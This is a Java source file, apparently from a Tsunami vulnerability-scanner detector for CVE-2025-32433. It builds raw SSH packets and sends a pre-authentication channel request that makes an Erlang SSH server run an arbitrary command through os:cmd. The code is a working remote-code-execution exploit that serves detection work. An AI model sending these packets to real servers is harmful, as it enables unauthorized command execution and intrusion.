package com.google.tsunami.plugins.detectors.rce.cve202532433;

import com.google.common.flogger.GoogleLogger;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class SshClient {
  public static boolean connectAndExecuteCommand(
      Socket socket, String command, GoogleLogger logger) {
    try {
      socket.setSoTimeout(5000);
      OutputStream out = socket.getOutputStream();
      InputStream in = socket.getInputStream();

      // 1. Banner exchange
      logger.atWarning().log("1. Banner exchange");
      out.write("SSH-2.0-OpenSSH_8.9\r\n".getBytes());
      out.flush();
      byte[] bannerBuffer = new byte[1024];
      int bytesRead = in.read(bannerBuffer);
      if (bytesRead > 0) {
        String banner = new String(bannerBuffer, 0, bytesRead).trim();
        if (!banner.startsWith("SSH-2.0-Erlang/")) {
          return false; // Don't proceed if not Erlang SSH server
        }
      } else {
        return false; // No banner received or connection closed
      }
      Thread.sleep(500); // Small delay between packets

      // 2. Send SSH_MSG_KEXINIT
      logger.atWarning().log("2. Send SSH_MSG_KEXINIT");
      byte[] kexPacket = buildKexinit();
      out.write(padPacket(kexPacket));
      out.flush();
      Thread.sleep(500); // Small delay between packets

      // 3. Send SSH_MSG_CHANNEL_OPEN
      logger.atWarning().log("3. Send SSH_MSG_CHANNEL_OPEN");
      byte[] chanOpen = buildChannelOpen();
      out.write(padPacket(chanOpen));
      out.flush();
      Thread.sleep(500); // Small delay between packets

      // 4. Send SSH_MSG_CHANNEL_REQUEST (pre-auth!)
      logger.atWarning().log("4. Send SSH_MSG_CHANNEL_REQUEST (pre-auth!)");
      byte[] chanReq = buildChannelRequest(String.format("os:cmd(\"%s\").", command));
      out.write(padPacket(chanReq));
      Thread.sleep(500); // Small delay between packets
      out.flush();
      // Exploit sent!
      socket.close();
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("inside: 4. Send SSH_MSG_CHANNEL_REQUEST (pre-auth!)");
      return false; // Command failed or connection error
    }
    return true; // Command sent successfully
  }

  // Helper to format SSH string (4-byte length + bytes)
  private static byte[] stringPayload(String s) {
    byte[] strBytes = s.getBytes();
    ByteBuffer buffer = ByteBuffer.allocate(4 + strBytes.length);
    buffer.order(ByteOrder.BIG_ENDIAN);
    buffer.putInt(strBytes.length);
    buffer.put(strBytes);
    return buffer.array();
  }

  // Builds SSH_MSG_CHANNEL_OPEN for session
  private static byte[] buildChannelOpen() {
    ByteBuffer buffer = ByteBuffer.allocate(1 + 4 + "session".getBytes().length + 4 + 4 + 4);
    buffer.put((byte) 0x5A); // SSH_MSG_CHANNEL_OPEN
    buffer.put(stringPayload("session"));
    buffer.order(ByteOrder.BIG_ENDIAN);
    buffer.putInt(0); // sender channel ID
    buffer.putInt(0x68000); // initial window size
    buffer.putInt(0x10000); // max packet size
    return buffer.array();
  }

  // Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload
  private static byte[] buildChannelRequest(String command) {
    byte[] execBytes = stringPayload("exec");
    byte[] cmdBytes = stringPayload(command);

    ByteBuffer buffer = ByteBuffer.allocate(1 + 4 + execBytes.length + 1 + cmdBytes.length);
    buffer.put((byte) 0x62); // SSH_MSG_CHANNEL_REQUEST
    buffer.order(ByteOrder.BIG_ENDIAN);
    buffer.putInt(0); // sender channel ID
    buffer.put(execBytes);
    buffer.put((byte) 0x01); // want_reply = true
    buffer.put(cmdBytes);
    return buffer.array();
  }

  // Builds a minimal but valid SSH_MSG_KEXINIT packet
  private static byte[] buildKexinit() {
    byte[] cookie = new byte[16]; // All zeros

    // KEX algorithms
    byte[] kexAlgos =
        stringPayload(
            "curve25519-sha256,ecdh-sha2-nistp256,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256");

    // Host key algorithms
    byte[] hostKeyAlgos = stringPayload("rsa-sha2-256,rsa-sha2-512");

    // Encryption algorithms (client->server, server->client)
    byte[] encAlgos = stringPayload("aes128-ctr");

    // MAC algorithms (client->server, server->client)
    byte[] macAlgos = stringPayload("hmac-sha1");

    // Compression algorithms (client->server, server->client)
    byte[] compAlgos = stringPayload("none");

    // Languages (client->server, server->client)
    byte[] langAlgos = stringPayload("");

    ByteBuffer buffer =
        ByteBuffer.allocate(
            1
                + cookie.length
                + kexAlgos.length
                + hostKeyAlgos.length
                + encAlgos.length * 2
                + macAlgos.length * 2
                + compAlgos.length * 2
                + langAlgos.length * 2
                + 1
                + 4);

    buffer.put((byte) 0x14); // SSH_MSG_KEXINIT
    buffer.put(cookie);
    buffer.put(kexAlgos);
    buffer.put(hostKeyAlgos);
    buffer.put(encAlgos);
    buffer.put(encAlgos);
    buffer.put(macAlgos);
    buffer.put(macAlgos);
    buffer.put(compAlgos);
    buffer.put(compAlgos);
    buffer.put(langAlgos);
    buffer.put(langAlgos);
    buffer.put((byte) 0x00); // first_kex_packet_follows
    buffer.order(ByteOrder.BIG_ENDIAN);
    buffer.putInt(0); // reserved

    return buffer.array();
  }

  private static byte[] padPacket(byte[] payload) {
    // blockSize is 8
    int minPadding = 4;
    int paddingLen = 8 - ((payload.length + 5) % 8);
    if (paddingLen < minPadding) {
      paddingLen += 8;
    }

    byte[] padding = new byte[paddingLen];
    // Padding bytes can be all zeros

    ByteBuffer buffer = ByteBuffer.allocate(4 + 1 + payload.length + paddingLen);
    buffer.order(ByteOrder.BIG_ENDIAN);
    buffer.putInt(payload.length + 1 + paddingLen);
    buffer.put((byte) paddingLen);
    buffer.put(payload);
    buffer.put(padding);

    return buffer.array();
  }
}
